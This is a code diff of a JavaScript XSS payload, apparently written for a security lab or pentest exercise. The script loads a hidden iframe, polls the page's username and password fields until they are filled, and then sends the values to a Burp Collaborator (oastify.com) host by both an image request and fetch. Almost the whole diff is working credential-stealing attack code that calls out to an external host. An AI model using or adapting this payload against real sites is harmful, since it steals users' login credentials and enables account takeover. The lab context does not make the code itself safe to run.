@@ -1,35 +1,64 @@
-// life.js - Fixed version
+// life1.js - Poll until password is populated
 (function() {
-    // Wait for DOM to be ready
     function init() {
-        alert('Step 1: Starting password extraction...');
+        alert('Step 1: Creating iframe...');
         
-        // Create hidden iframe
         var iframe = document.createElement('iframe');
         iframe.src = '/web/guest/add';
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
         
         iframe.onload = function() {
-            alert('Step 2: Password page loaded!');
+            alert('Step 2: Iframe loaded, waiting for the password...');
             
-            setTimeout(function() {
+            var attempts = 0;
+            var maxAttempts = 20; // Try for 20 seconds
+            
+            // Poll every second until password is found
+            var checker = setInterval(function() {
+                attempts++;
+                
                 try {
-                    var username = iframe.contentDocument.querySelector('input[name="fake_username"]').value;
-                    var password = iframe.contentDocument.querySelector('input[name="fake_password"]').value;
+                    var pwdInput = iframe.contentDocument.querySelector('input[name="fake_password"]');
+                    var userInput = iframe.contentDocument.querySelector('input[name="fake_username"]');
                     
-                    alert('🔑 Password: ' + password);
+                    var password = pwdInput ? pwdInput.value : '';
+                    var username = userInput ? userInput.value : '';
                     
-                    var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
-                    fetch(collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password));
-                    new Image().src = collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
+                    console.log('Attempt ' + attempts + ': pwd=' + password + ', user=' + username);
                     
-                    alert('✅ Sent to Burp Collaborator!');
+                    // Check if we got values
+                    if (password && password.length > 0) {
+                        clearInterval(checker);
+                        
+                        alert('✅ Password found: ' + password);
+                        
+                        // Send to Burp Collaborator
+                        var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
+                        
+                        // Use Image to avoid CORS issues
+                        var img = new Image();
+                        img.src = collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
+                        document.body.appendChild(img);
+                        
+                        // Also try fetch
+                        fetch(collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password))
+                            .catch(function(e) {
+                                console.log('Fetch failed (expected due to CORS), but image request sent');
+                            });
+                        
+                        alert('✅ Password sent to Burp Collaborator!');
+                        
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(checker);
+                        alert('❌ Timeout: Password never populated after ' + maxAttempts + ' seconds');
+                    }
                     
                 } catch(e) {
+                    clearInterval(checker);
                     alert('❌ Error: ' + e.message);
                 }
-            }, 3000);
+            }, 1000); // Check every 1 second
         };
     }
     
@@ -37,7 +66,6 @@
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
-        // DOM already loaded
         init();
     }
 })();
